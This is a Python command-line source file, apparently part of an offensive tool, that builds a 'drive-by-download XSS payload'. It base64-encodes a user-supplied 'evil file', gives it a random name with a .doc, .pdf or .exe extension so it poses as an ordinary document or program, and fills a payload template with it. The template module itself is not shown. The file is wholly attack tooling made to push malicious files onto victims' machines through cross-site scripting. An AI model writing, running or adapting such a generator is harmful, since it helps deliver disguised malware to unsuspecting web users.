import click
import sys
import string
import random

from core.encoder import b64
from core.convert import sub

__author__  = 'Demetrius Ford'
__version__ = 'v1.0.5'

CHOICES = (
    '.doc',  # => Microsoft Word for Windows/Word97
    '.pdf',  # => Acrobat-Portable document format
    '.exe',  # => Microsoft Portable Executable (PE)
)


def show_version(ctx, param, value):
    if not value or ctx.resilient_parsing:
        return
    click.echo(__version__)
    ctx.exit(0)


@click.command()
@click.option('--version',
              is_flag=True,
              callback=show_version,
              expose_value=False,
              is_eager=True)
@click.option('--extension',
              type=click.Choice(CHOICES, case_sensitive=True))
@click.option('--evil-file',
              type=click.Path(exists=True, dir_okay=False))
def generate(extension, evil_file):
    """Generate a drive-by-download XSS payload."""
    cli_args = sys.argv[1:]

    no_extension, no_evil_file = (
        not extension,
        not evil_file,
    )

    if len(cli_args) == 0 \
            or no_extension \
            or no_evil_file:
        context = click.get_current_context()
        click.echo(context.get_help())
        context.exit(2)

    char_set = string.printable[:36]
    filename = ''.join(random.choice(char_set) for _ in range(7))
    embedded = b64(evil_file)

    click.echo(sub((filename + extension, embedded)))


if __name__ == '__main__':
    generate()
